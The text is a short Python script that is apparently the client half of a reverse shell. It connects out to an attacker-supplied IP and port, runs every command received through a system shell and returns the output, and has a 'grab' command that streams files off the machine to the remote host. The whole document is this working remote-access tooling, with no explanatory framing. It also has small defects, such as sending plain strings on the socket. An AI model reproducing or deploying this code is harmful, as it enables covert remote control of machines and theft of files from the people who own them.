import subprocess
import socket
import sys
import os

if len(sys.argv) < 2:
    print('[-] Usage: shell-client.py [IP] [PORT]')
    sys.exit(-1)

port = int(sys.argv[2])
ip = sys.argv[1]

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while packet != b'':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()
    else:
        s.send('Unable to find the file')

def connect():

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))

    while True:
        command = s.recv(1024)

        if b'terminate' in command:
            s.close()
            break
        elif b'grab' in command:
            grab,path = command.split(b'*')
            try:
                transfer(s,path)
            except:
                s.send(b'Error occured while handling file')
        else:
            CMD = subprocess.Popen(command.decode(encoding='utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())


def main():
    connect()

if __name__ == '__main__':
    main()
